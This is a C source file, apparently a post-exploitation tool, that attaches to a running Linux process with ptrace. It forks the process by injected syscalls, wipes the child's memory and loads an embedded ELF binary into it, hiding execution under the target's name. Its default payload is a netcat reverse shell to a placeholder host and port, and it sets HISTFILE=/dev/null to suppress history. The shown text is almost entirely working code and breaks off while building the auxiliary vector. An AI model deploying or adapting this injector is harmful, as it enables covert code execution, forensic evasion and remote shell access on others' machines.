/*
 * Title:  userland exec (Linux)
 * Author: Shuichiro Endo
 */

#define _DEBUG

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <elf.h>
#include <unistd.h>
#include <fcntl.h>

#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/auxv.h>

#include "ulexec.h"
#include "elffile.h"	// xxd -i xxx > elffile.h	e.g. xxd -i /usr/bin/nc > elffile.h

// head -1 elffile.h
// e.g. unsigned char _usr_bin_nc[] = {
unsigned char *exec_file = _usr_bin_nc;

char *env_string[] = {
"PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:", 
"SHELL=/bin/bash", 
"HISTFILE=/dev/null", 
"\0", 
"\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0"};	// do not delete

int env_count = 3;

// e.g. nc -e /bin/bash 127.0.0.1 1234
char *argv_string[] = {
"-e", 
"/bin/bash", 
"127.0.0.1", 
"1234", 
"\0", 
"\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0"};	// do not delete

int argv_count = 5;	// e.g. exec file name (1) + argv_string (4) = 5

int auxv_count = 21;


unsigned long load_elf(pid_t pid, struct user_regs_struct regs, unsigned long tmp_address, unsigned char *elf_file, unsigned long base_address)
{
#ifdef _DEBUG
	printf("[I] check elf file.\n");
#endif
	Elf64_Ehdr *pElf64_Ehdr = (Elf64_Ehdr *)elf_file;
	
	if(pElf64_Ehdr->e_ident[0]!=0x7f || pElf64_Ehdr->e_ident[1]!=0x45 || pElf64_Ehdr->e_ident[2]!=0x4c || pElf64_Ehdr->e_ident[3]!=0x46 || pElf64_Ehdr->e_ident[4]!=0x2 || pElf64_Ehdr->e_ident[5]!=0x1 || pElf64_Ehdr->e_ident[6]!=0x1){
#ifdef _DEBUG
		printf("[E] elf file magic error.\n");
#endif
		return 1;
	}
	
	if(pElf64_Ehdr->e_type!=ET_EXEC && pElf64_Ehdr->e_type!=ET_DYN){
#ifdef _DEBUG
		printf("[E] elf file type error.\n");
#endif
		return 1;
	}
	
	if(pElf64_Ehdr->e_machine!=EM_X86_64){
#ifdef _DEBUG
		printf("[E] elf file machine error.\n");
#endif
		return 1;
	}
	
	
#ifdef _DEBUG
	printf("[I] check memory size.\n");
#endif
	Elf64_Off e_phoff = pElf64_Ehdr->e_phoff;
	Elf64_Half e_phnum = pElf64_Ehdr->e_phnum;
	Elf64_Half e_phentsize = pElf64_Ehdr->e_phentsize;	
	Elf64_Phdr *pElf64_Phdr = (Elf64_Phdr *)(elf_file + e_phoff);
	unsigned long memory_size = 0;	
	ldiv_t result;
	
	for(int i=0; i<e_phnum; i++){
		if(pElf64_Phdr[i].p_type == PT_LOAD){
			result = ldiv(pElf64_Phdr[i].p_vaddr+pElf64_Phdr[i].p_memsz, pElf64_Phdr[i].p_align);
			if(result.rem != 0){
				memory_size = result.quot * pElf64_Phdr[i].p_align + pElf64_Phdr[i].p_align;
			}else{
				memory_size = result.quot * pElf64_Phdr[i].p_align;
			}
		}
	}
#ifdef _DEBUG
	printf("[I] memory_size:0x%lx\n", memory_size);
#endif
	
	
#ifdef _DEBUG
	printf("[I] map memory.\n");
#endif
	regs.rax = 9;		// mmap
	regs.rdi = base_address;
	regs.rsi = memory_size;
	regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;
	regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
	regs.r8 = -1;
	regs.r9 = 0;
	regs.rip = tmp_address;
	
	if(ptrace(PTRACE_SETREGS, pid, NULL, &regs) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SETREGS) error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_POKETEXT, pid, regs.rip, 0x050f) != 0){	// 0f 05	system call
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SINGLESTEP) error.\n");
#endif
		return 1;
	}
	
	if(pid != waitpid(pid, NULL, 0)){
#ifdef _DEBUG
		printf("[E] waitpid error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_GETREGS, pid, NULL, &regs) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_GETREGS) error.\n");
#endif
		return 1;
	}
	
	unsigned long elf_base_address = regs.rax;
#ifdef _DEBUG
	printf("[I] elf_base_address:0x%lx memory_size:0x%lx\n", elf_base_address, memory_size);
#endif
	
	
#ifdef _DEBUG
	printf("[I] write data in the mapped memory.\n");
#endif
	unsigned long address = 0;
	unsigned long size = 0;
	unsigned long data = 0;
	unsigned char *buffer = NULL;
	unsigned long align = 0;
	unsigned long flags = 0;

	for(int i=0; i<e_phnum; i++){
		if(pElf64_Phdr[i].p_type == PT_LOAD){
			address = elf_base_address + pElf64_Phdr[i].p_vaddr;
			buffer = (unsigned char *)(elf_file + pElf64_Phdr[i].p_offset);

			for(unsigned long j=0; j<pElf64_Phdr[i].p_filesz; j+=sizeof(unsigned long), address+=sizeof(unsigned long)){
				data = ((unsigned long *)buffer)[j/sizeof(unsigned long)];
				if(ptrace(PTRACE_POKETEXT, pid, address, data) != 0){
#ifdef _DEBUG
					printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
					return 1;
				}
#ifdef _DEBUG
//				printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
			}
			
			align = ~(pElf64_Phdr[i].p_align - 1);
			address = (elf_base_address + pElf64_Phdr[i].p_vaddr) & align;
			result = ldiv(pElf64_Phdr[i].p_memsz, pElf64_Phdr[i].p_align);
			if(result.rem != 0){
				size = result.quot * pElf64_Phdr[i].p_align + pElf64_Phdr[i].p_align;
			}else{
				size = result.quot * pElf64_Phdr[i].p_align;
			}
			
#ifdef _DEBUG
			printf("[I] mprotect address:0x%lx size:0x%lx flags:0x%x\n", address, size, pElf64_Phdr[i].p_flags);
#endif
			flags = 0;
			if(pElf64_Phdr[i].p_flags & 0x4){
				flags = flags | PROT_READ;
			}
			
			if(pElf64_Phdr[i].p_flags & 0x2){
				flags = flags | PROT_WRITE;
			}
			
			if(pElf64_Phdr[i].p_flags & 0x1){
				flags = flags | PROT_EXEC;
			}

			regs.rax = 10;		// mprotect
			regs.rdi = address;
			regs.rsi = size;
			regs.rdx = flags;
			regs.rip = tmp_address;
			
			if(ptrace(PTRACE_SETREGS, pid, NULL, &regs) != 0){
#ifdef _DEBUG
				printf("[E] ptrace(PTRACE_SETREGS) error.\n");
#endif
				return 1;
			}
			
			if(ptrace(PTRACE_POKETEXT, pid, regs.rip, 0x050f) != 0){	// 0f 05	system call
#ifdef _DEBUG
				printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
				return 1;
			}
			
			if(ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) != 0){
#ifdef _DEBUG
				printf("[E] ptrace(PTRACE_SINGLESTEP) error.\n");
#endif
				return 1;
			}
			
			if(pid != waitpid(pid, NULL, 0)){
#ifdef _DEBUG
				printf("[E] waitpid error.\n");
#endif
				return 1;
			}
			
			if(ptrace(PTRACE_GETREGS, pid, NULL, &regs) != 0){
#ifdef _DEBUG
				printf("[E] ptrace(PTRACE_GETREGS) error.\n");
#endif
				return 1;
			}
			
			if(regs.rax != 0){
#ifdef _DEBUG
				printf("[E] mprotect error.\n");
#endif
			}
		}
	}

	return elf_base_address;
}

void usage(char *filename)
{
	printf("userland exec\n");
	printf("usage         : %s -p target_pid\n", filename);
	printf("example       : %s -p 12345\n", filename);
}

int main(int argc, char **argv)
{
	int opt;
	const char* optstring = "p:";

	pid_t ppid = 0;
	pid_t cpid = 0;

	while((opt=getopt(argc, argv, optstring)) != -1){
		switch(opt){
		case 'p':
			ppid = atoi(optarg);
			break;
		
		default:
			usage(argv[0]);
			exit(1);
		}
	}

	if(ppid == 0){
		usage(argv[0]);
		exit(1);
	}

#ifdef _DEBUG
	printf("[I] attach to the target process.\n");
#endif
	if(ptrace(PTRACE_ATTACH, ppid, NULL, NULL) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_ATTACH) error.\n");
#endif
		return 1;
	}
	
	if(ppid != waitpid(ppid, NULL, 0)){
#ifdef _DEBUG
		printf("[E] waitpid error.\n");
#endif
		return 1;
	}
	
	
#ifdef _DEBUG
	printf("[I] backup registers of the target process.\n");
#endif
	struct user_regs_struct ppid_regs_bkup;
	struct user_fpregs_struct ppid_fpregs_bkup;
	
	if(ptrace(PTRACE_GETREGS, ppid, NULL, &ppid_regs_bkup) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_GETREGS) error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_GETFPREGS, ppid, NULL, &ppid_fpregs_bkup) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_GETFPREGS) error.\n");
#endif
		return 1;
	}
	
	
#ifdef _DEBUG
	printf("[I] backup code of the target process.\n");
#endif
	unsigned long ppid_code_bkup[5] = {0};
	
	for(int i=0; i<4; i++){
		ppid_code_bkup[i] = ptrace(PTRACE_PEEKTEXT, ppid, ppid_regs_bkup.rip+i, 0);
		if(errno != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_PEEKTEXT) error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] rip:0x%lx ppid_code_bkup:0x%lx\n", ppid_regs_bkup.rip+i, ppid_code_bkup[i]);
#endif
	}
	
	
#ifdef _DEBUG
	printf("[I] fork the target process.\n");
#endif
	struct user_regs_struct regs;
	memcpy(&regs, &ppid_regs_bkup, sizeof(ppid_regs_bkup));
	regs.rax = 57;		// fork
	
	if(ptrace(PTRACE_SETREGS, ppid, NULL, &regs) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SETREGS) error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_POKETEXT, ppid, regs.rip, 0xfeeb050f) != 0){	// 0f 05 eb ef	system call + jmp $
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_SINGLESTEP, ppid, NULL, NULL) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SINGLESTEP) error.\n");
#endif
		return 1;
	}

	if(ppid != waitpid(ppid, NULL, 0)){
#ifdef _DEBUG
		printf("[E] waitpid error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_GETREGS, ppid, NULL, &regs) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_GETREGS) error.\n");
#endif
		return 1;
	}
		
	cpid = regs.rax;
#ifdef _DEBUG
	printf("[I] child pid:%d\n", cpid);
#endif	
	
	
#ifdef _DEBUG
	printf("[I] attach the child process.\n");
#endif
	if(ptrace(PTRACE_ATTACH, cpid, NULL, NULL) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_ATTACH) error.\n");
#endif
		return 1;
	}
	
	if(cpid != waitpid(cpid, NULL, 0)){
#ifdef _DEBUG
		printf("[E] waitpid error.\n");
#endif
		return 1;
	}
	
	
	
#ifdef _DEBUG
	printf("[I] restore backup code of the target process.\n");
#endif
	for(int i=0; i<4; i++){
		if(ptrace(PTRACE_POKETEXT, ppid, ppid_regs_bkup.rip+i, ppid_code_bkup[i]) != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
			return 1;
		}
	}
	
	
#ifdef _DEBUG
	printf("[I] restore registers of target process.\n");
#endif
	if(ptrace(PTRACE_SETREGS, ppid, NULL, &ppid_regs_bkup) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SETREGS) error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_SETFPREGS, ppid, NULL, &ppid_fpregs_bkup) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SETFPREGS) error.\n");
#endif
		return 1;
	}
	
	
#ifdef _DEBUG
	printf("[I] detach the target process.\n");
#endif
	if(ptrace(PTRACE_DETACH, ppid, NULL, NULL) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_DETACH) error.\n");
#endif
		return 1;
	}
	
	
#ifdef _DEBUG
	printf("[I] backup registers of the child process.\n");
#endif
	struct user_regs_struct cpid_regs_bkup;
	if(ptrace(PTRACE_GETREGS, cpid, NULL, &cpid_regs_bkup) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_GETREGS) error.\n");
#endif
		return 1;
	}
	
	
#ifdef _DEBUG
	printf("[I] map a temporary space in the child process memory.\n");
#endif
	regs.rax = 9;		// mmap
	regs.rdi = 0;
	regs.rsi = 0x1000;
	regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;
	regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
	regs.r8 = -1;
	regs.r9 = 0;
	
	if(ptrace(PTRACE_SETREGS, cpid, NULL, &regs) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SETREGS) error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_POKETEXT, cpid, cpid_regs_bkup.rip, 0x050f) != 0){	// 0f 05	system call
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_SINGLESTEP, cpid, NULL, NULL) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SINGLESTEP) error.\n");
#endif
		return 1;
	}
	
	if(cpid != waitpid(cpid, NULL, 0)){
#ifdef _DEBUG
		printf("[E] waitpid error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_GETREGS, cpid, NULL, &regs) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_GETREGS) error.\n");
#endif
		return 1;
	}
	
	unsigned long tmp_address = regs.rax;
#ifdef _DEBUG
	printf("[I] tmp_address:%lx\n", tmp_address);
#endif
	
	
#ifdef _DEBUG
	printf("[I] read a /proc/%d/maps file.\n", ppid);
#endif
	char file_maps[1000] = {0};
	FILE *file = NULL;
	unsigned long start, end, offset, major, minor, inode;
	char address_string[34] = {0};
	char start_string[17] = {0};
	char end_string[17] = {0};
	char *ptr;
	char mode[5] = {0};
	char filepath[1000] = {0};
	int count = 0;
	int unmap_flag = 0;
	char parent_filepath[1000] = {0};
	char parent_filename[1000] = {0};
	unsigned long base_address = 0;
	unsigned long stack_start_address = 0;
	unsigned long stack_top_address = 0;
	unsigned long stack_size = 0;
	unsigned long vvar_start_address = 0;
	unsigned long vvar_size = 0;
	unsigned long vdso_start_address = 0;
	unsigned long vdso_size = 0;
	
	sprintf(file_maps, "/proc/%d/maps", ppid);
	file = fopen(file_maps, "r");
	while(fgets(file_maps, sizeof(file_maps), file)){
		sscanf(file_maps, "%s %4c %lx %x:%x %lx %s", address_string, mode, &offset, &major, &minor, &inode, filepath);
		ptr = strtok(address_string, "-");
		start = strtoul(ptr, (char **)NULL, 16);
		ptr = strtok(NULL, "-");	
		if(ptr != NULL){
			end = strtoul(ptr, (char **)NULL, 16);			
		}
		
#ifdef _DEBUG
		printf("[I] start:0x%lx end:0x%lx mode:%s offset:%lx major:%lx minor:%lx inode:%lx filepath:%s\n", start, end, mode, offset, major, minor, inode, filepath);
#endif
		
		if(count == 0){
			memcpy(parent_filepath, filepath, strlen(filepath)+1);
			int i = strlen(parent_filepath);
			while(i != 0){
				if(parent_filepath[i] == '/'){
					i++;
					break;	
				}
				i--;
			}
			memcpy(parent_filename, &parent_filepath[i], strlen(parent_filepath)-i+1);
#ifdef _DEBUG
			printf("[I] parent_filepath:%s parent_filename:%s\n", parent_filepath, parent_filename);
#endif
			base_address = start - 0x10000000000;
#ifdef _DEBUG
			printf("[I] base_address:0x%lx\n", base_address);
#endif
		}
		count++;
		
		unmap_flag = 0;
		
		if(!strncmp(filepath, parent_filepath, strlen(parent_filepath)+1)){
			unmap_flag = 1;
		}else if(!strncmp(filepath, "[heap]", strlen("[heap]"))){
			unmap_flag = 1;
		}else if(strstr(filepath, ".so")){
			unmap_flag = 1;
		}
		
		if(!strncmp(filepath, "[stack]", strlen("[stack]"))){
			stack_start_address = start;
			stack_top_address = end;
			stack_size = end - start;
#ifdef _DEBUG
			printf("[I] stack_start_address:0x%lx stack_top_address:0x%lx stack_size:0x%lx\n", stack_start_address, stack_top_address, stack_size);
#endif
		}else if(!strncmp(filepath, "[vvar]", strlen("[vvar]"))){
			vvar_start_address = start;
			vvar_size = end - start;
#ifdef _DEBUG
			printf("[I] vvar_start_address:0x%lx vvar_size:0x%lx\n", vvar_start_address, vvar_size);
#endif
		}else if(!strncmp(filepath, "[vdso]", strlen("[vdso]"))){
			vdso_start_address = start;
			vdso_size = end - start;
#ifdef _DEBUG
			printf("[I] vdso_start_address:0x%lx vdso_size:0x%lx\n", vdso_start_address, vdso_size);
#endif
		}

		if(unmap_flag == 1){
#ifdef _DEBUG
			printf("[I] unmap the memory of the child process.\n");
#endif
			memcpy(&regs, &cpid_regs_bkup, sizeof(cpid_regs_bkup));
			regs.rax = 11;		// munmap
			regs.rdi = start;
			regs.rsi = end - start;
			regs.rip = tmp_address;
		
			if(ptrace(PTRACE_SETREGS, cpid, NULL, &regs) != 0){
#ifdef _DEBUG
				printf("[E] ptrace(PTRACE_SETREGS) error.\n");
#endif
				return 1;
			}
		
			if(ptrace(PTRACE_POKETEXT, cpid, regs.rip, 0x050f) != 0){	// 0f 05	system call
#ifdef _DEBUG
				printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
				return 1;
			}
		
			if(ptrace(PTRACE_SINGLESTEP, cpid, NULL, NULL) != 0){
#ifdef _DEBUG
				printf("[E] ptrace(PTRACE_SINGLESTEP) error.\n");
#endif
				return 1;
			}
		
			if(cpid != waitpid(cpid, NULL, 0)){
#ifdef _DEBUG
				printf("[E] waitpid error.\n");
#endif
				return 1;
			}
		
			if(ptrace(PTRACE_GETREGS, cpid, NULL, &regs) != 0){
#ifdef _DEBUG
				printf("[E] ptrace(PTRACE_GETREGS) error.\n");
#endif
				return 1;
			}
		
			if(regs.rax != 0){
#ifdef _DEBUG
				printf("regs.rip:%lx regs.rax:%d\n", regs.rip, regs.rax);
#endif
			}
		}
	}
	fclose(file);
	
	
#ifdef _DEBUG
	printf("[I] read a /proc/%d/status file.\n", ppid);
#endif
	char file_status[1000] = {0};
	char name[100] = {0};
	unsigned long real_uid = 0;
	unsigned long effective_uid = 0;
	unsigned long saved_set_uid = 0;
	unsigned long filesystem_uid = 0;
	unsigned long real_gid = 0;
	unsigned long effective_gid = 0;
	unsigned long saved_set_gid = 0;
	unsigned long filesystem_gid = 0;
	
	sprintf(file_status, "/proc/%d/status", ppid);
	file = fopen(file_status, "r");
	while(fgets(file_status, sizeof(file_status), file)){
		sscanf(file_status, "%s ", name);
		
		if(!strncmp(name, "Uid", strlen("Uid"))){
			sscanf(file_status, "%s %x %x %x %x", name, &real_uid, &effective_uid, &saved_set_uid, &filesystem_uid);
#ifdef _DEBUG
			printf("[I] real_uid:%lx effective_uid:%lx saved_set_uid:%lx filesystem_uid:%lx\n", real_uid, effective_uid, saved_set_uid, filesystem_uid);
#endif
		}else if(!strncmp(name, "Gid", strlen("Gid"))){
			sscanf(file_status, "%s %x %x %x %x", name, &real_gid, &effective_gid, &saved_set_gid, &filesystem_gid);
#ifdef _DEBUG
			printf("[I] real_gid:%lx effective_gid:%lx saved_set_gid:%lx filesystem_gid:%lx\n", real_gid, effective_gid, saved_set_gid, filesystem_gid);
#endif
		}
	}
	fclose(file);
	
	
#ifdef _DEBUG
	printf("[I] load the exec_file in the child process memory.\n");
#endif
	Elf64_Ehdr *pElf64_Ehdr = (Elf64_Ehdr *)exec_file;
	Elf64_Phdr *pElf64_Phdr = (Elf64_Phdr *)(exec_file + pElf64_Ehdr->e_phoff);
	base_address = load_elf(cpid, regs, tmp_address, exec_file, base_address);
	if(base_address == 1){
#ifdef _DEBUG
		printf("[E] load_elf error.\n");
#endif
		return 1;
	}
	unsigned long entry_point = base_address + pElf64_Ehdr->e_entry;
#ifdef _DEBUG
	printf("[I] base_address:0x%lx\n", base_address);
#endif
	
	
#ifdef _DEBUG
	printf("[I] read an elf dynamic linker/loader file.\n");
#endif
	char *interpreter = NULL;
	unsigned char *interpreter_file = (unsigned char *)malloc(409600);
	int fd = -1;
	int ret = 0;
	unsigned long interpreter_base_address = 0;
	
	for(int i=0; i<pElf64_Ehdr->e_phnum; i++){
		if(pElf64_Phdr[i].p_type == PT_INTERP){
			interpreter = (char *)(exec_file + pElf64_Phdr[i].p_offset);
#ifdef _DEBUG
			printf("[I] interpreter:%s\n", interpreter);
#endif
		}
	}
	
	if(interpreter != NULL){
		fd = open(interpreter, O_RDONLY);
		if(fd == -1){
#ifdef _DEBUG
			printf("[E] open error.\n");
#endif
			return 1;
		}
	
		ret = read(fd, interpreter_file, 409600);
		if(ret == -1){
#ifdef _DEBUG
			printf("[E] read error.\n");
#endif
			return 1;
		}
		
#ifdef _DEBUG
		printf("[I] load the elf dynamic linker/loader file in the child process memory.\n");
#endif
		interpreter_base_address = load_elf(cpid, regs, tmp_address, interpreter_file, 0);
		if(interpreter_base_address == 1){
#ifdef _DEBUG
			printf("[E] load_elf error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] interpreter_base_address:0x%lx\n", interpreter_base_address);
#endif
		Elf64_Ehdr *pElf64_Ehdr_interpreter = (Elf64_Ehdr *)interpreter_file;
		entry_point = interpreter_base_address + pElf64_Ehdr_interpreter->e_entry;
#ifdef _DEBUG
		printf("[I] entry_point:0x%lx\n", entry_point);
#endif
		close(fd);
	}
	free(interpreter_file);
	
/*	
#ifdef _DEBUG
	printf("[I] map a stack space in the child process memory.\n");
#endif
	regs.rax = 9;		// mmap
	regs.rdi = stack_start_address;
	regs.rsi = stack_size;
	regs.rdx = PROT_READ | PROT_WRITE;
	regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
	regs.r8 = -1;
	regs.r9 = 0;
	regs.rip = tmp_address;
	
	if(ptrace(PTRACE_SETREGS, cpid, NULL, &regs) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SETREGS) error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_POKETEXT, cpid, regs.rip, 0x050f) != 0){	// 0f 05	system call
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_SINGLESTEP, cpid, NULL, NULL) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SINGLESTEP) error.\n");
#endif
		return 1;
	}
	
	if(cpid != waitpid(cpid, NULL, 0)){
#ifdef _DEBUG
		printf("[E] waitpid error.\n");
#endif
		return 1;
	}
	
	if(ptrace(PTRACE_GETREGS, cpid, NULL, &regs) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_GETREGS) error.\n");
#endif
		return 1;
	}
	
	if(stack_start_address != regs.rax){
#ifdef _DEBUG
		printf("[E] mmap error.\n");
#endif
		return 1;
	}
*/	
	
#ifdef _DEBUG
	printf("[I] setup a stack memory of the child process.\n");
#endif
	unsigned long AT_EXECFN_data_start_address = 0;
	unsigned long env_string_start_address = 0;
	unsigned long argv_string_start_address = stack_top_address - 0x1000;
	unsigned long auxv_data_start_address = stack_top_address - 0x2000;		// 16 bytes alignment
	unsigned long AT_PLATFORM_data_start_address = 0;
	char platform[] = "x86_64";
	unsigned long AT_RANDOM_data_start_address = 0;
	unsigned long auxv_start_address = 0;
	unsigned long env_start_address = 0;
	unsigned long argv_start_address = 0;
	unsigned long argc_start_address = 0;
	unsigned long stack_pointer = 0;

	unsigned long argv_address[100+1] = {0};
	unsigned long env_address[100+1] = {0};

	unsigned char *buffer = NULL;
	unsigned long length = 0;
	unsigned long address = 0;
	unsigned long data = 0;
	
#ifdef _DEBUG
	printf("[I] write argv strings in the stack memory.\n");
#endif
	buffer = NULL;
	length = 0;
	address = 0;
	data = 0;
	int parent_filename_length = strlen(parent_filename) + 1;
	
	argv_address[0] = argv_string_start_address;
	length += parent_filename_length;
	
	for(int i=0; i<argv_count-1; i++){
		argv_address[i+1] = argv_string_start_address + length;
		length += strlen(argv_string[i]) + 1;
	}
	
	buffer = (unsigned char *)parent_filename;
	address = argv_string_start_address;
		
	for(unsigned long j=0; j<parent_filename_length; j+=sizeof(unsigned long), address+=sizeof(unsigned long)){
		data = ((unsigned long *)buffer)[j/sizeof(unsigned long)];
		if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	}
	length -= parent_filename_length;
	
	buffer = (unsigned char *)argv_string[0];
	address = argv_string_start_address + parent_filename_length;
		
	for(unsigned long j=0; j<length; j+=sizeof(unsigned long), address+=sizeof(unsigned long)){
		data = ((unsigned long *)buffer)[j/sizeof(unsigned long)];
		if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	}
			
	
#ifdef _DEBUG
	printf("[I] write env strings in the stack memory.\n");
#endif
	env_string_start_address = argv_string_start_address + parent_filename_length + length;
	
	buffer = NULL;
	length = 0;
	address = 0;
	data = 0;
	
	for(int i=0; i<env_count; i++){
		env_address[i] = env_string_start_address + length;
		length += strlen(env_string[i]) + 1;
	}
	
	buffer = (unsigned char *)env_string[0];
	address = env_string_start_address;
		
	for(unsigned long j=0; j<length; j+=sizeof(unsigned long), address+=sizeof(unsigned long)){
		data = ((unsigned long *)buffer)[j/sizeof(unsigned long)];
		if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	}
	
	
#ifdef _DEBUG
	printf("[I] write auxv data in the stack memory.\n");
#endif	
	// AT_EXECFN
	AT_EXECFN_data_start_address = env_string_start_address + length;
	length = strlen(parent_filepath) + 1;
	buffer = (unsigned char *)parent_filepath;
	address = AT_EXECFN_data_start_address;
	
	for(unsigned long j=0; j<length; j+=sizeof(unsigned long), address+=sizeof(unsigned long)){
		data = ((unsigned long *)buffer)[j/sizeof(unsigned long)];
		if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	}
		
	// AT_RANDOM
	AT_RANDOM_data_start_address = auxv_data_start_address;
	length = sizeof(unsigned long);
	address = AT_RANDOM_data_start_address;
	data = 0xdeadbeefdeadbeef;	// random data
	
	if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
		return 1;
	}
#ifdef _DEBUG
	printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	
	// AT_PLATFORM
	AT_PLATFORM_data_start_address = AT_RANDOM_data_start_address + length;
	length = strlen(platform) + 1;
	buffer = (unsigned char *)platform;
	address = AT_PLATFORM_data_start_address;
	
	for(unsigned long j=0; j<length; j+=sizeof(unsigned long), address+=sizeof(unsigned long)){
		data = ((unsigned long *)buffer)[j/sizeof(unsigned long)];
		if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	}
	
	
#ifdef _DEBUG
	printf("[I] check alignment.\n");
#endif
	unsigned long size = 0;
	int zero_padding_count = 0;
	size = (1 + (argv_count + 1) + (env_count + 1)) * sizeof(unsigned long) + auxv_count * sizeof(AUX_VECTOR);	// argc + argv + env + auxv
	
	if(size & 0xf){	// not 16 bytes alignment
#ifdef _DEBUG
		printf("[I] write zero padding.\n");
#endif
		size += sizeof(unsigned long);
		zero_padding_count += 1;
		
		// zero padding
		address = auxv_data_start_address - sizeof(unsigned long) * zero_padding_count;
		data = 0x0;
	
		if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	}
	
	
#ifdef _DEBUG
	printf("[I] write auxiliary vector in the stack memory.\n");
#endif	
	buffer = NULL;
	length = 0;
	address = 0;
	data = 0;
	AUX_VECTOR auxiliary_vector[30] = {0};	// LD_SHOW_AUXV=1 sleep 1
	
	// AT_SYSINFO_EHDR
	auxiliary_vector[0].type = AT_SYSINFO_EHDR;
	auxiliary_vector[0].data = vdso_start_address;
	
	// AT_MINSIGSTKSZ
	auxiliary_vector[1].type = AT_MINSIGSTKSZ;
	auxiliary_vector[1].data = 2032;
	
	// AT_HWCAP
	auxiliary_vector[2].type = AT_HWCAP;
	auxiliary_vector[2].data = 0xbfebfbff;
	
